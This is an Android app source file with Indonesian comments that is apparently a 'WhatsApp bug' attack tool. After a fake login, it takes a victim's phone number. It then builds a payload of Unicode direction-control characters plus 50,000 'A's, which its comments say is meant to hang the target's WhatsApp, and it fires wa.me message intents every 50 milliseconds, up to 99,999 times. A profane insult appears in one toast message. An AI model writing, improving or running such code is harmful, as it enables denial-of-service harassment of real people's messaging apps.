package com.langz.bug;

import android.content.Intent;
import android.net.Uri;
import android.os.Bundle;
import android.os.Handler;
import android.os.Looper;
import android.view.View;
import android.widget.Button;
import android.widget.EditText;
import android.widget.LinearLayout;
import android.widget.Toast;
import android.widget.VideoView;
import androidx.appcompat.app.AppCompatActivity;

public class MainActivity extends AppCompatActivity {

    EditText target;
    Button kirim, btnLogin;
    LinearLayout formInput;
    VideoView videoAnimasi;

    @Override
    protected void onCreate(Bundle b) {
        super.onCreate(b);
        setContentView(R.layout.activity_main);

        target = findViewById(R.id.target);
        kirim  = findViewById(R.id.kirim);
        btnLogin = findViewById(R.id.btn_login);
        formInput = findViewById(R.id.form_input);
        videoAnimasi = findViewById(R.id.video_animasi);

        // SETUP VIDEO MUTER
        try {
            String videoPath = "android.resource://" + getPackageName() + "/" + R.raw.video_bug;
            Uri uri = Uri.parse(videoPath);
            videoAnimasi.setVideoURI(uri);
            videoAnimasi.start();
            videoAnimasi.setOnPreparedListener(mp -> mp.setLooping(true));
        } catch (Exception e) {
            // Abaikan jika video gagal dimuat
        }

        // TOMBOL LOGIN
        btnLogin.setOnClickListener(v -> {
            formInput.setVisibility(View.VISIBLE);
            btnLogin.setVisibility(View.GONE);
            Toast.makeText(this, "Login Berhasil!", Toast.LENGTH_SHORT).show();
        });

        // TOMBOL EKSEKUSI BUG
        kirim.setOnClickListener(v -> {
            String nomor = target.getText().toString().trim();
            if (nomor.isEmpty()) {
                Toast.makeText(this, "Nomor target mana bangsat?", Toast.LENGTH_SHORT).show();
                return;
            }
            eksekusiBug(nomor, "com.whatsapp");
        });
    }

    private void eksekusiBug(String nomor, String paketWA) {
        Handler h = new Handler(Looper.getMainLooper());
        StringBuilder sb = new StringBuilder();
        sb.append("\u202E\u202D\u202C\u200F\u200E");
        
        // Payload Force Close (50.000 teks biar WA target hang)
        for (int i = 0; i < 50000; i++) sb.append("A"); 
        final String payload = sb.toString();

        Runnable r = new Runnable() {
            int count = 0;
            @Override
            public void run() {
                if (count >= 99999) return;
                try {
                    Intent i = new Intent(Intent.ACTION_VIEW);
                    i.setPackage(paketWA);
                    i.setData(Uri.parse("https://wa.me/" + nomor + "?text=" + Uri.encode(payload + count)));
                    i.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
                    startActivity(i);
                } catch (Exception e) {}
                count++;
                h.postDelayed(this, 50); // Jeda 50ms
            }
        };
        h.post(r);
    }
    }
